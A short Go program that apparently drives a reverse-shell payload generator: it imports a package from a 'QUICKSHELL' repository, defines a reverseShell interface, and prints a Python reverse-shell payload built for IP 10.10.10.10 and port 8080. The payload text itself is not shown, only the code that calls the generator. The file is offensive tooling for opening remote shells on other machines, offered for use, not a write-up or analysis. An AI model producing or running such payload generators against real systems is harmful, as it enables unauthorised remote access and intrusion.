package main

import (
	"fmt"

	rev "github.com/QUICKSHELL/cmd/functions"
)

type program struct {
	ip       string
	port     string
	language string
}

type reverseShell interface {
	payload(lang string) string
}

func (p program) payload(lang string) string {

	var pay string
	if lang == p.language {

		r := rev.Python(p.ip, p.port)
		pay = r
	}

	return pay

}

func main() {

	var t reverseShell = program{ip: "10.10.10.10", port: "8080", language: "python"}

	r := t.payload("python")

	fmt.Println(r)

}
